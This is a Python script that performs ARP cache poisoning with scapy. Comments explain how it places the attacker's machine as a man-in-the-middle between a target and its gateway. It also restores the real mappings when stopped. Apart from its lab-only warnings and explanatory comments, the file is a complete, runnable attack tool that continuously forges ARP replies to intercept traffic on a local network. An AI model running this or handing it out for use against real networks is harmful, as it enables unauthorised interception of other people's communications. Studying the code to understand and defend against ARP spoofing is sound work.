

#arp_spoofing - ARP cashe poisoning demo(MITM positioning)
#ARP is a stateless, unauthenticated protocol - any device accepts an ARP reply even if it never sent a request, and silently overwrites its ARP cashe with whatever IP->MAC mapping its told. This script exploits by continuously lying to two hosts.
#-it tells the target the gateways ip lives at my mac address
#-it tells the gateway the targets ip lives at my mac address
#both machines now communicate through my machine.

#-This is the technique attackers use on public wifi and open LANS to intercept unencrypted traffic - which is why also a VPN protects you even on compromised networks - it just makes the intercepted traffic unreadable.

#USE ONLY on a lab network you own/control, with devices you have explicit
#permission to test. Running this against someone else's devices without
#consent is illegal in most jurisdictions (unauthorized interception).
 
#USAGE:
#sudo python3 ARPSPOOFER.py <target_ip> <gateway_ip>

import sys
import time

try:
    from scapy.all import ARP, Ether, getmacbyip, send, srp
except ImportError:
    sys.exit("Install scapy first: pip install scapy")

def get_mac(ip: str) -> str | None:
    #Resolve an IP's MAC address via ARP (uses scapy's built-in helper)
    mac = getmacbyip(ip)
    return mac
def spoof(target_ip: str, target_mac: str, spoof_ip: str) -> None:
    #Send a forged ARP reply: spoof_ip lives at my mac
    #op=2 means ARP reply - op=1 would be a request
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
def restore(dest_ip: str, dest_mac: str, src_ip: str, src_mac: str) -> None:
    #Send the True mapping to undo the poisoning when we're done
    packet = ARP(
        op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac
    )
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit("Usage: sudo python3 arp_spoofer.py <target_ip> <gateway_ip>")
    target_ip, gateway_ip = sys.argv[1], sys.argv[2]

    print("ARP Spoofing Engine - Local Lab Defense Audit Only")
    print(f"Resolving MAC addresses - {target_ip} and {gateway_ip}...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        sys.exit(
            " COULD NOT RESOLVE BOTH OR ONE MAC ADDRESSES. - MAKE SURE BOTH HOST ARE ON SAME SUBNET AS THIS MACHINE."

        )   
    print(f"target - {target_ip} -> {target_mac}")
    print(f"gateway - {gateway_ip} -> {gateway_mac}")
    print("STARTING...SPOOOFFFFFING....")

    packets_sent = 0
    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            packets_sent += 2
            print(f"Packets sent: {packets_sent}", end="", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print("STOPPED!!! - RESTORING EVERYTHING")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("DONE!!!")
